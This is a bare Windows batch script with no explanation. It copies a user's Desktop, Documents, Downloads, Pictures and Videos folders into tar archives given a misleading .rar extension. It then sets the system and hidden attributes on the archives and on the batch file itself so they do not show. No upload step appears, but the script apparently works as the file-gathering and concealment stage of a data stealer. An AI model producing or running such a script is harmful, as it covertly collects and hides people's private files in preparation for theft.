@echo off
chcp 65001
cls
attrib +s +h *.bat
tar.exe -cvf desk.rar "%UserProfile%\Desktop"
attrib +s +h *.rar
tar.exe -cvf docs.rar "%UserProfile%\Documents"
attrib +s +h *.rar
tar.exe -cvf down.rar "%UserProfile%\Downloads"
attrib +s +h *.rar
tar.exe -cvf imgs.rar "%UserProfile%\Pictures"
attrib +s +h *.rar
tar.exe -cvf vids.rar "%UserProfile%\Videos"
attrib +s +h *.rar